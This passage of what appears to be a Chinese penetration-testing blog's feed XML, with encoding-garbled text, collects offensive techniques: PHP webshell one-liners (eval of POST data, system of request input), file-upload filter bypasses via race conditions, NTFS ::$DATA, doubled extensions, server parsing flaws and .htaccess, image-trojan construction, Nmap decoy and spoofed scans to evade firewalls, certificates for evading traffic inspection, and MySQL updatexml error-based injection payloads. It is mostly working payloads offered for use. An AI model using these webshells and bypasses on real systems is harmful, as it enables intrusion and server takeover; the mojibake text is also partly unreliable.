å·²æˆåŠŸæ’å…¥</h3><pre class="line-numbers language-bash"><code class="language-bash">~<span class="token comment" spellcheck="true"># file pic.jpg</span>pic.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, comment: <span class="token string">"&lt;?php system(['cmd']); ?>"</span>, baseline, precision 8, 1920x840, components 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="4-ä¿®æ”¹ä¸º-PHP-æ–‡ä»¶"><a href="#4-ä¿®æ”¹ä¸º-PHP-æ–‡ä»¶" class="headerlink" title="4. ä¿®æ”¹ä¸º PHP æ–‡ä»¶"></a>4. ä¿®æ”¹ä¸º PHP æ–‡ä»¶</h3><pre class="line-numbers language-bash"><code class="language-bash">~<span class="token comment" spellcheck="true"># mv pic.jpg pic.php.jpg</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><h2 id="0x04-æ–‡ä»¶å†…å®¹ç»•è¿‡"><a href="#0x04-æ–‡ä»¶å†…å®¹ç»•è¿‡" class="headerlink" title="0x04 æ–‡ä»¶å†…å®¹ç»•è¿‡"></a>0x04 æ–‡ä»¶å†…å®¹ç»•è¿‡</h2><h3 id="1-å¸¸ç”¨-payload"><a href="#1-å¸¸ç”¨-payload" class="headerlink" title="1. å¸¸ç”¨ payload"></a>1. å¸¸ç”¨ payload</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?</span><span class="token operator">=</span>`<span class="token variable">$_GET</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span>`<span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>@<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x05-åˆ©ç”¨-NTFS-ADS-ç‰¹æ€§"><a href="#0x05-åˆ©ç”¨-NTFS-ADS-ç‰¹æ€§" class="headerlink" title="0x05 åˆ©ç”¨ NTFS ADS ç‰¹æ€§"></a>0x05 åˆ©ç”¨ NTFS ADS ç‰¹æ€§</h2><p>ADS æ˜¯ NTFS ç£ç›˜æ ¼å¼çš„ä¸€ä¸ªç‰¹æ€§ï¼Œç”¨äº NTFS äº¤æ¢æ•°æ®æµã€‚<br>åœ¨ php+windows çš„æƒ…å†µä¸‹ï¼šå¦‚æœ<code>æ–‡ä»¶å+::$DATA</code>ä¼šæŠŠ<code>::$DATA</code>ä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†ï¼Œä¸ä¼šæ£€æµ‹åç¼€åï¼Œä¸”ä¿æŒ<code>::$DATA</code>ä¹‹å‰çš„æ–‡ä»¶åã€‚<br>ä¾‹å¦‚ï¼š<code>1.php::$DATA</code></p><table><thead><tr><th><strong>ä¸Šä¼ æ–‡ä»¶å</strong></th><th><strong>ç”Ÿæˆæ–‡ä»¶</strong></th><th><strong>ç”Ÿæˆçš„æ–‡ä»¶å†…å®¹</strong></th></tr></thead><tbody><tr><td>Truda.php:a.jpg</td><td>Truda.php</td><td>ç©º</td></tr><tr><td>Truda.php::$DATA</td><td>truda.php</td><td><!--?php phpinfo(); ?--></td></tr><tr><td>Truda.php::$INDEX_ALLOCATION</td><td>truda.php</td><td>ç©º</td></tr><tr><td>truda.php::$DATA.jpg</td><td>0.jpg</td><td><!--?php phpinfo(); ?--></td></tr><tr><td>truda.php::$DATA\eee.jpg</td><td>eee.jpg</td><td><!--?php phpinfo(); ?--></td></tr></tbody></table><p>è¿™é‡Œï¼Œæˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªåä¸º xxx.php::$DATA çš„æœ¨é©¬ï¼Œç„¶åï¼Œåœ¨æµè§ˆå™¨ä¸­è®¿é—® xxx.phpã€‚<br>â€‹</p><h2 id="0x06-åˆ†å—ä¼ è¾“-waf"><a href="#0x06-åˆ†å—ä¼ è¾“-waf" class="headerlink" title="0x06 åˆ†å—ä¼ è¾“ waf"></a>0x06 åˆ†å—ä¼ è¾“ waf</h2><p>åˆ©ç”¨ Burpsuit åˆ†å—ä¼ è¾“æ’ä»¶ <a href="https://github.com/c0ny1/chunked-coding-converter">chunked-coding-converter</a> ç»•è¿‡ WAF æ£€æµ‹ã€‚<br>ä¾‹å¦‚ï¼šå®å¡” WAF<br>â€‹</p><h2 id="0x07-æ¡ä»¶ç«äº‰ç»•è¿‡"><a href="#0x07-æ¡ä»¶ç«äº‰ç»•è¿‡" class="headerlink" title="0x07 æ¡ä»¶ç«äº‰ç»•è¿‡"></a>0x07 æ¡ä»¶ç«äº‰ç»•è¿‡</h2><h3 id="ç½‘ç«™å¤„ç†é€»è¾‘"><a href="#ç½‘ç«™å¤„ç†é€»è¾‘" class="headerlink" title="ç½‘ç«™å¤„ç†é€»è¾‘"></a>ç½‘ç«™å¤„ç†é€»è¾‘</h3><ul><li>ç½‘ç«™å…è®¸ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œç„¶åæ£€æŸ¥ä¸Šä¼ æ–‡ä»¶æ˜¯å¦åŒ…å« webshellï¼Œå¦‚æœåŒ…å«åˆ é™¤è¯¥æ–‡ä»¶ã€‚</li><li>ç½‘ç«™å…è®¸ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œä½†æ˜¯å¦‚æœä¸æ˜¯æŒ‡å®šç±»å‹ï¼Œé‚£ä¹ˆä½¿ç”¨ unlink åˆ é™¤æ–‡ä»¶ã€‚</li></ul><p>â€‹</p><h3 id="åˆ©ç”¨æ–¹å¼"><a href="#åˆ©ç”¨æ–¹å¼" class="headerlink" title="åˆ©ç”¨æ–¹å¼"></a>åˆ©ç”¨æ–¹å¼</h3><p>åœ¨ç½‘ç«™åˆ é™¤ä¸Šä¼ çš„ php æ–‡ä»¶ä¹‹å‰è®¿é—®è¯¥æ–‡ä»¶ï¼Œä»è€Œæ‰§è¡Œä¸Šä¼ æ–‡ä»¶ä¸­çš„ php ä»£ç ã€‚<br>ä¾‹å¦‚ï¼šä¸Šä¼ æ–‡ä»¶ä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">'shell.php'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'&lt;?php @eval($_POST["cmd"])?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å…ˆè¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼Œåè¿›è¡Œåˆ¤æ–­ä¸åˆ é™¤ï¼Œåˆ©ç”¨æ—¶é—´å·®è¿›è¡Œ webshell ä¸Šä¼ ã€‚<br>æŠ€å·§ï¼šä½¿ç”¨ burpsuite å¾ªç¯è®¿é—®ä¸Šä¼ çš„æ–‡ä»¶ï¼Œç„¶åå¾ªç¯è¿›è¡Œä¸Šä¼ ã€‚<br>â€‹</p><h2 id="0x08-æ–‡ä»¶ååŒå†™ç»•è¿‡"><a href="#0x08-æ–‡ä»¶ååŒå†™ç»•è¿‡" class="headerlink" title="0x08 æ–‡ä»¶ååŒå†™ç»•è¿‡"></a>0x08 æ–‡ä»¶ååŒå†™ç»•è¿‡</h2><p>ä¾‹å¦‚è¿™æ ·çš„é™åˆ¶ä»£ç ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$deny_ext</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç›´æ¥ä½¿ç”¨åŒå†™ç»•è¿‡å°±è¡Œ x.pphphp ï¼Œæœ€åç”Ÿæˆ x.php æ–‡ä»¶ã€‚<br>â€‹</p><h2 id="0x09-é…åˆæ–‡ä»¶è§£ææ¼æ´ç»•è¿‡"><a href="#0x09-é…åˆæ–‡ä»¶è§£ææ¼æ´ç»•è¿‡" class="headerlink" title="0x09 é…åˆæ–‡ä»¶è§£ææ¼æ´ç»•è¿‡"></a>0x09 é…åˆæ–‡ä»¶è§£ææ¼æ´ç»•è¿‡</h2><h3 id="1-IIS-5-x-6-0-è§£ææ¼æ´"><a href="#1-IIS-5-x-6-0-è§£ææ¼æ´" class="headerlink" title="1. IIS 5.x/6.0 è§£ææ¼æ´"></a>1. IIS 5.x/6.0 è§£ææ¼æ´</h3><p>ç›®å½•è§£æï¼š<code>/xxx.asp/xxx.jpg</code><br>æ–‡ä»¶è§£æï¼š<code>xxx.asp;.jpg</code></p><h3 id="2-IIS-7-0-IIS-7-5-Nginx-lt-8-03-ç•¸å½¢è§£ææ¼æ´"><a href="#2-IIS-7-0-IIS-7-5-Nginx-lt-8-03-ç•¸å½¢è§£ææ¼æ´" class="headerlink" title="2. IIS 7.0/IIS 7.5/ Nginx <8.03 ç•¸å½¢è§£ææ¼æ´"></a>2. IIS 7.0/IIS 7.5/ Nginx &lt;8.03 ç•¸å½¢è§£ææ¼æ´</h3><p>æ¼æ´æˆå› ï¼šnginx é»˜è®¤ä»¥ cgi çš„æ–¹å¼æ”¯æŒ php çš„è¿è¡Œï¼Œè­¬å¦‚åœ¨é…ç½®æ–‡ä»¶å½“ä¸­ fastcgi æ–¹å¼ä¸‹ cgi.fix_pathinfo æ˜¯å¼€å¯çš„ã€‚<br>æ¶‰åŠç‰ˆæœ¬ï¼š<strong>php5.2.12</strong>ã€<strong>php5.3.1(Default)</strong><br>åœ¨é»˜è®¤ Fast-CGI å¼€å¯çŠ¶å†µä¸‹ï¼Œä¸Šä¼ ä¸€ä¸ªåå­—ä¸º <strong>xxx.jpg</strong>ï¼Œå†…å®¹ä¸º</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?PHP</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">'shell.php'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'&lt;?php eval($_POST[cmd])?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åè®¿é—®<strong>xxx.jpg/.php</strong>ï¼Œåœ¨è¿™ä¸ªç›®å½•ä¸‹å°±ä¼šç”Ÿæˆä¸€å¥è¯æœ¨é©¬<strong>shell.php</strong></p><h3 id="3-Nginx-lt-8-03-ç©ºå­—èŠ‚ä»£ç æ‰§è¡Œæ¼æ´"><a href="#3-Nginx-lt-8-03-ç©ºå­—èŠ‚ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="3. Nginx <8.03 ç©ºå­—èŠ‚ä»£ç æ‰§è¡Œæ¼æ´"></a>3. Nginx &lt;8.03 ç©ºå­—èŠ‚ä»£ç æ‰§è¡Œæ¼æ´</h3><p>å½±å“ç‰ˆæœ¬ï¼š0.5.<em>, 0.6.</em>, 0.7&lt;=0.7.65, 0.8&lt;=0.8.37<br>Nginx åœ¨å›¾ç‰‡ä¸­åµŒå…¥ PHP ä»£ç ï¼Œç„¶åé€šè¿‡è®¿é—®<code>/xxx.jpg%00.php</code> æ¥æ‰§è¡Œå…¶ä¸­çš„ä»£ç .<br>â€‹</p><h3 id="4-Apache-è§£ææ¼æ´"><a href="#4-Apache-è§£ææ¼æ´" class="headerlink" title="4. Apache è§£ææ¼æ´"></a>4. Apache è§£ææ¼æ´</h3><p>Apache æ˜¯ä»å³åˆ°å·¦å¼€å§‹åˆ¤æ–­è§£æï¼Œå¦‚æœä¸ºä¸å¯è¯†åˆ«è§£æï¼Œå°±å†å¾€å·¦åˆ¤æ–­.<br>æ¯”å¦‚ _xxx.php.owf.rar_ï¼Œâ€œ.owfâ€å’Œâ€.rarâ€è¿™ä¸¤ç§åç¼€æ˜¯ apache ä¸å¯è¯†åˆ«è§£æï¼Œapache å°±ä¼šæŠŠ xxx.php.owf.rar è§£ææˆ phpã€‚<br>â€‹</p><p>å¦‚ä½•åˆ¤æ–­æ˜¯ä¸æ˜¯åˆæ³•çš„åç¼€å°±æ˜¯è¿™ä¸ªæ¼æ´çš„åˆ©ç”¨å…³é”®ï¼Œæµ‹è¯•æ—¶å¯ä»¥å°è¯•ä¸Šä¼ ä¸€ä¸ª xxx.php.rara.jpg.pngâ€¦ï¼ˆæŠŠä½ çŸ¥é“çš„å¸¸è§åç¼€éƒ½å†™ä¸Šâ€¦ï¼‰å»æµ‹è¯•æ˜¯å¦æ˜¯åˆæ³•åç¼€.<br>â€‹</p><h2 id="0x10-ä¸Šä¼ -htaccess-æ–‡ä»¶"><a href="#0x10-ä¸Šä¼ -htaccess-æ–‡ä»¶" class="headerlink" title="0x10 ä¸Šä¼ .htaccess æ–‡ä»¶"></a>0x10 ä¸Šä¼ .htaccess æ–‡ä»¶</h2><p><strong>.htaccess</strong>æ–‡ä»¶ä»‹ç»ï¼š.htaccess æ–‡ä»¶æ˜¯ Apache æœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„<strong>ç½‘é¡µé…ç½®</strong>ã€‚<br>å¯ä»¥å°è¯•ä¸Šä¼  <strong>.htaccess</strong> æ–‡ä»¶ï¼š</p><pre class="line-numbers language-html"><code class="language-html">// è¡¨ç¤ºæŠŠjpgå½“ä½œphpæ‰§è¡Œ AddType application/x-httpd-php .jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‚è€ƒèµ„æ–™</p><blockquote><p><a href="http://www.kxsy.work/2021/07/13/wen-jian-shang-chuan-lou-dong/">ã€Šæµ…è°ˆæ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‹</a> &gt; <a href="https://yinwc.github.io/2020/04/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">ã€Šæ–‡ä»¶ä¸Šä¼ æ¼æ´æ€»ç»“ã€‹</a> &gt; <a href="https://www.yuque.com/feiniao112/hnk3pi/gtn7a2#n8EL2">ã€Šæ–‡ä»¶ä¸Šä¼ åŠ Fuzzã€‹</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
            <tag> ç»•è¿‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmapç»•è¿‡é˜²ç«å¢™æ‰«æ</title>
      <link href="/post/ced5a0fe.html"/>
      <url>/post/ced5a0fe.html</url>
      
        <content type="html"><![CDATA[<h1 id="Nmap-ç»•è¿‡é˜²ç«å¢™æ‰«æ"><a href="#Nmap-ç»•è¿‡é˜²ç«å¢™æ‰«æ" class="headerlink" title="Nmap ç»•è¿‡é˜²ç«å¢™æ‰«æ"></a>Nmap ç»•è¿‡é˜²ç«å¢™æ‰«æ</h1><h2 id="ä¸€ã€ä½¿ç”¨-Nmap-è„šæœ¬è¿›è¡Œé˜²ç«å¢™æ£€æµ‹"><a href="#ä¸€ã€ä½¿ç”¨-Nmap-è„šæœ¬è¿›è¡Œé˜²ç«å¢™æ£€æµ‹" class="headerlink" title="ä¸€ã€ä½¿ç”¨ Nmap è„šæœ¬è¿›è¡Œé˜²ç«å¢™æ£€æµ‹"></a>ä¸€ã€ä½¿ç”¨ Nmap è„šæœ¬è¿›è¡Œé˜²ç«å¢™æ£€æµ‹</h2><pre class="line-numbers language-bash"><code class="language-bash">nmap --script<span class="token operator">=</span>firewalk --traceroute www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">nmap --traceroute --script firewalk --script-args firewalk.recv-timeout<span class="token operator">=</span>60000,firewalk.max-active-probes<span class="token operator">=</span>3,firewalk.max-retries<span class="token operator">=</span>3,firewalk.probe-timeout<span class="token operator">=</span>600 www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 80 --script http-waf-detect www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 80 --script http-waf-detect --script-args<span class="token operator">=</span><span class="token string">"http-waf-detect.detectBodyChanges"</span> www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="äºŒã€Nmap-çªç ´é˜²ç«å¢™æ‰«æ"><a href="#äºŒã€Nmap-çªç ´é˜²ç«å¢™æ‰«æ" class="headerlink" title="äºŒã€Nmap çªç ´é˜²ç«å¢™æ‰«æ"></a>äºŒã€Nmap çªç ´é˜²ç«å¢™æ‰«æ</h2><h3 id="1-ç¢ç‰‡æ‰«æ"><a href="#1-ç¢ç‰‡æ‰«æ" class="headerlink" title="1. ç¢ç‰‡æ‰«æ"></a>1. ç¢ç‰‡æ‰«æ</h3><pre class="line-numbers language-bash"><code class="language-bash">nmap -f www.example.comnmap -mtu 8 www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-è¯±é¥µæ‰«æ"><a href="#2-è¯±é¥µæ‰«æ" class="headerlink" title="2. è¯±é¥µæ‰«æ"></a>2. è¯±é¥µæ‰«æ</h3><pre class="line-numbers language-bash"><code class="language-bash">nmap -D RND:10 www.example.comnmap â€“D decoy1,decoy2,decoy3 www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-ç©ºé—²æ‰«æ"><a href="#3-ç©ºé—²æ‰«æ" class="headerlink" title="3. ç©ºé—²æ‰«æ"></a>3. ç©ºé—²æ‰«æ</h3><pre class="line-numbers language-bash"><code class="language-bash">nmap -P0 -sI zombie www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-éšæœºæ•°æ®é•¿åº¦"><a href="#4-éšæœºæ•°æ®é•¿åº¦" class="headerlink" title="4. éšæœºæ•°æ®é•¿åº¦"></a>4. éšæœºæ•°æ®é•¿åº¦</h3><pre class="line-numbers language-bash"><code class="language-bash">nmap --data-length 25 www.example.comnmap --randomize-hosts www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="5-æ¬ºéª—æ‰«æ"><a href="#5-æ¬ºéª—æ‰«æ" class="headerlink" title="5. æ¬ºéª—æ‰«æ"></a>5. æ¬ºéª—æ‰«æ</h3><pre class="line-numbers language-bash"><code class="language-bash">nmap --sT -PN --spoof-mac aa:bb:cc:dd:ee:ff www.example.comnmap --badsum www.example.comnmap -g 80 -S www.baidu.com www.example.comnmap -p80 --script http-methods --script-args http.useragent<span class="token operator">=</span><span class="token string">"Mozilla 5"</span> www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é˜²ç«å¢™ </tag>
            
            <tag> Nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å›¾é©¬åˆ¶ä½œ</title>
      <link href="/post/9b491ac2.html"/>
      <url>/post/9b491ac2.html</url>
      
        <content type="html"><![CDATA[<h1 id="å›¾é©¬åˆ¶ä½œ"><a href="#å›¾é©¬åˆ¶ä½œ" class="headerlink" title="å›¾é©¬åˆ¶ä½œ"></a>å›¾é©¬åˆ¶ä½œ</h1><h2 id="ä¸€ã€ç®€ä»‹"><a href="#ä¸€ã€ç®€ä»‹" class="headerlink" title="ä¸€ã€ç®€ä»‹"></a>ä¸€ã€ç®€ä»‹</h2><p>å›¾é©¬åˆç§°ä¸ºå›¾ç‰‡é©¬ï¼Œå¯ä»¥æŠŠ<strong>æ¶æ„ä»£ç </strong>éšè—åˆ°å›¾ç‰‡ä¸­ï¼Œè€Œä¸å½±å“å›¾ç‰‡çš„æ­£å¸¸æ˜¾ç¤ºï¼Œé€šå¸¸ç”¨äº<strong>ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´</strong>ä¸­ç»•è¿‡é™åˆ¶ã€‚</p><h2 id="äºŒã€åˆ¶ä½œæ–¹æ³•"><a href="#äºŒã€åˆ¶ä½œæ–¹æ³•" class="headerlink" title="äºŒã€åˆ¶ä½œæ–¹æ³•"></a>äºŒã€åˆ¶ä½œæ–¹æ³•</h2><h2 id="é¦–å…ˆå‡†å¤‡ä¸¤ä¸ªæ–‡ä»¶"><a href="#é¦–å…ˆå‡†å¤‡ä¸¤ä¸ªæ–‡ä»¶" class="headerlink" title="é¦–å…ˆå‡†å¤‡ä¸¤ä¸ªæ–‡ä»¶"></a>é¦–å…ˆå‡†å¤‡ä¸¤ä¸ªæ–‡ä»¶</h2><ul><li>image.png æ˜¯ä¸€å¼ æ­£å¸¸çš„å›¾ç‰‡</li><li>pass.php æ˜¯å¯æ‰§è¡Œç¨‹åºä»£ç æ–‡ä»¶</li></ul><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> image.png pass.php <span class="token operator">></span> mumu.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Windowns"><a href="#Windowns" class="headerlink" title="Windowns"></a>Windowns</h2><pre class="line-numbers language-bash"><code class="language-bash">copy image.png/b + pass.php muma.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç”Ÿæˆçš„ muma.png å°±æ˜¯å›¾ç‰‡é©¬ã€‚<br>â€‹</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å›¾é©¬ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨SSL/TLSå¯¹æŠ—æµé‡æ£€æµ‹</title>
      <link href="/post/9015fd24.html"/>
      <url>/post/9015fd24.html</url>
      
        <content type="html"><![CDATA[<h1 id="ä½¿ç”¨-SSL-TLS-å¯¹æŠ—æµé‡æ£€æµ‹"><a href="#ä½¿ç”¨-SSL-TLS-å¯¹æŠ—æµé‡æ£€æµ‹" class="headerlink" title="ä½¿ç”¨ SSL/TLS å¯¹æŠ—æµé‡æ£€æµ‹"></a>ä½¿ç”¨ SSL/TLS å¯¹æŠ—æµé‡æ£€æµ‹</h1><h2 id="ä¸€ã€è¯ä¹¦ç”Ÿæˆï¼ˆopenssl-ç”Ÿæˆè‡ªå®šä¹‰è¯ä¹¦ï¼‰"><a href="#ä¸€ã€è¯ä¹¦ç”Ÿæˆï¼ˆopenssl-ç”Ÿæˆè‡ªå®šä¹‰è¯ä¹¦ï¼‰" class="headerlink" title="ä¸€ã€è¯ä¹¦ç”Ÿæˆï¼ˆopenssl ç”Ÿæˆè‡ªå®šä¹‰è¯ä¹¦ï¼‰"></a>ä¸€ã€è¯ä¹¦ç”Ÿæˆï¼ˆopenssl ç”Ÿæˆè‡ªå®šä¹‰è¯ä¹¦ï¼‰</h2><p>ä½¿ç”¨ SSL/TLS è®¤è¯ï¼Œç¬¬ä¸€æ­¥å°±æ˜¯ç”Ÿæˆä¸€ä¸ª SSL è¯ä¹¦ã€‚</p><ol><li>æ¨¡æ¿ 1</li></ol><pre class="line-numbers language-bash"><code class="language-bash">openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \-subj <span class="token string">"/C=UK/ST=London/L=London/O=Development/CN=www.google.com"</span> \-keyout www.google.com.key \-out www.google.com.crt <span class="token operator">&amp;&amp;</span> \<span class="token function">cat</span> www.google.com.key www.google.com.crt <span class="token operator">></span> www.google.com.pem <span class="token operator">&amp;&amp;</span> \<span class="token function">rm</span> -f www.google.com.key www.google.com.crt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>æ¨¡æ¿ 2</li></ol><pre class="line-numbers language-bash"><code class="language-bash">openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \-subj <span class="token string">"/C=US/ST=Texas/L=Austin/O=Development/CN=118.25.69.199"</span> \-keyout hack.key \-out hack.crt <span class="token operator">&amp;&amp;</span> \<span class="token function">cat</span> hack.key  hack.crt <span class="token operator">></span> hack.pem <span class="token operator">&amp;&amp;</span> \<span class="token function">rm</span> -f hack.key  hack.crt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æµé‡æ£€æµ‹ </tag>
            
            <tag> SSL/TLSâ€‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL xpath æŠ¥é”™æ³¨å…¥</title>
      <link href="/post/5fd295ac.html"/>
      <url>/post/5fd295ac.html</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL-xpath-æŠ¥é”™æ³¨å…¥"><a href="#MySQL-xpath-æŠ¥é”™æ³¨å…¥" class="headerlink" title="MySQL xpath æŠ¥é”™æ³¨å…¥"></a>MySQL xpath æŠ¥é”™æ³¨å…¥</h1><h2 id="ä¸€ã€å…³äº-updatexml-å‡½æ•°å’Œ-extractvalue-å‡½æ•°"><a href="#ä¸€ã€å…³äº-updatexml-å‡½æ•°å’Œ-extractvalue-å‡½æ•°" class="headerlink" title="ä¸€ã€å…³äº updatexml å‡½æ•°å’Œ extractvalue å‡½æ•°"></a>ä¸€ã€å…³äº updatexml å‡½æ•°å’Œ extractvalue å‡½æ•°</h2><p>æ ¼å¼ï¼š</p><pre class="line-numbers language-xml"><code class="language-xml">UPDATEXML(XML_document, XPath_string, new_value);extractvalue(XML_document, XPath_string, new_value);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_document æ˜¯ String æ ¼å¼ï¼Œä¸º XML æ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸º Docã€‚</li><li>ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpath æ ¼å¼çš„å­—ç¬¦ä¸²) ï¼Œå¦‚æœä¸äº†è§£ Xpath è¯­æ³•ï¼Œå¯ä»¥åœ¨ç½‘ä¸ŠæŸ¥æ‰¾æ•™ç¨‹ã€‚</li><li>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒString æ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®<br>ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼ã€‚</li></ul><pre class="line-numbers language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> @<span class="token variable">@version</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>?id<span class="token operator">=</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> @<span class="token variable">@version</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>?id<span class="token operator">=</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>SUBSTR<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> @<span class="token variable">@version</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>[0x7e å®é™…æ˜¯æ˜¯ 16 è¿›åˆ¶ï¼ŒMysql 